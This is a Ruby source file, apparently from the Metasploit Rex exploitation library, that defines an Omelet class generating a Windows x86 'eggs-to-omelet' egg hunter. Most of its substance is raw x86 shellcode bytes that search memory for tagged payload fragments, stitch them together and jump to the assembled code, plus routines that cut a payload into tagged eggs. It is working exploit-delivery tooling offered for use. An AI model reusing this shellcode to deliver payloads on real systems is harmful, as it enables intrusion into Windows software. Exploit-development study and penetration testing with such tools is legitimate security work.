require 'rex/text'
require 'rex/arch'

module Rex
module Exploitation

###
#
# This class provides an interface to generating an eggs-to-omelet hunter for win/x86.
#
# Written by corelanc0d3r <peter.ve@corelan.be>
#
###
class Omelet

	###
	#
	# Windows-based eggs-to-omelet hunters
	#
	###
	module Windows
		Alias = "win"

		module X86
			Alias = ARCH_X86

			#
			# The hunter stub for win/x86.
			#
			def hunter_stub
				{
					# option hash members go here (currently unused)
				}
			end

		end
	end

	###
	#
	# Generic interface
	#
	###

	#
	# Creates a new hunter instance and acquires the sub-class that should
	# be used for generating the stub based on the supplied platform and
	# architecture.
	#
	def initialize(platform, arch = nil)
		Omelet.constants.each { |c|
			mod = self.class.const_get(c)

			next if ((!mod.kind_of?(::Module)) or (!mod.const_defined?('Alias')))

			if (platform =~ /#{mod.const_get('Alias')}/i)
				self.extend(mod)

				if (arch and mod)
					mod.constants.each { |a|
						amod = mod.const_get(a)

						next if ((!amod.kind_of?(::Module)) or
							(!amod.const_defined?('Alias')))

						if (arch =~ /#{mod.const_get(a).const_get('Alias')}/i)
								amod = mod.const_get(a)

								self.extend(amod)
							end
						}
					end
				end
			}
		end

		#
		# This method generates an eggs-to-omelet hunter using the derived hunter stub.
		#
		def generate(payload, badchars = '', eggsize = 123, eggtag = "00w")
			return nil if ((opts = hunter_stub) == nil)

			# calculate number of eggs
			payloadlen = payload.length
			delta = payloadlen / eggsize
			delta = delta * eggsize
			nr_eggs = payloadlen / eggsize
			if delta < payloadlen
				nr_eggs = nr_eggs+1
			end

			# create omelet code

			the_omelet = "\xeb\x24" +
				"\x54\x5f" +
				"\x66\x81\xcf\xff\xff" +
				"\x89\xfa" +
				"\x31\xc0" +
				"\xb0" + nr_eggs.chr +
				"\x31\xf6" +
				"\x66\xbe" + (237-eggsize).chr + "\xff" +
				"\x4f\x46" +
				"\x66\x81\xfe\xff\xff" +
				"\x75\xf7" +
				"\x48" +
				"\x75\xee" +
				"\x31\xdb" +
				"\xb3" + (nr_eggs+1).chr +
				"\xc3" +
				"\xe8\xd7\xff\xff\xff" +
				"\xeb\x04" +
				"\x4a\x4a\x4a\x4a" +
				"\x42" +
				"\x52" +
				"\x6a\x02" +
				"\x58" +
				"\xcd\x2e" +
				"\x3c\x05" +
				"\x5a" +
				"\x74\xf4" +
				"\xb8\x01" + eggtag +
				"\x01\xd8" +
				"\x87\xfa" +
				"\xaf" +
				"\x87\xfa" +
				"\x75\xe2" +
				"\x89\xd6" +
				"\x31\xc9" +
				"\xb1"  + eggsize.chr +
				"\xf3\xa4" +
				"\x4b" +
				"\x80\xfb\x01" +
				"\x75\xd4" +
				"\xe8\xa4\xff\xff\xff" +
				"\xff\xe7"


			# create the eggs array

			eggs = Array.new(nr_eggs)
			total_size = eggsize * nr_eggs
			padlen = total_size - payloadlen
			#print("Padlen : #{padlen}")
			payloadpadding = ""
			if padlen > 0
				payloadpadding = "A" * padlen
			end
			fullcode = payload+payloadpadding
			eggcnt = nr_eggs+2
			startcode = 0
			arraycnt = 0
			while eggcnt > 2 do
				egg_prep = eggcnt.chr + eggtag
				this_egg = fullcode[startcode, eggsize]
				startcode = startcode + eggsize
				this_egg = egg_prep + this_egg
				eggcnt = eggcnt - 1
				eggs[arraycnt] = this_egg
				arraycnt = arraycnt + 1
			end

			return [ the_omelet, eggs ]
		end

protected

	#
	# Stub method that is meant to be overridden.  It returns the raw stub that
	# should be used as the omelet maker (combine the eggs).
	#
	def hunter_stub
	end

end

end
end
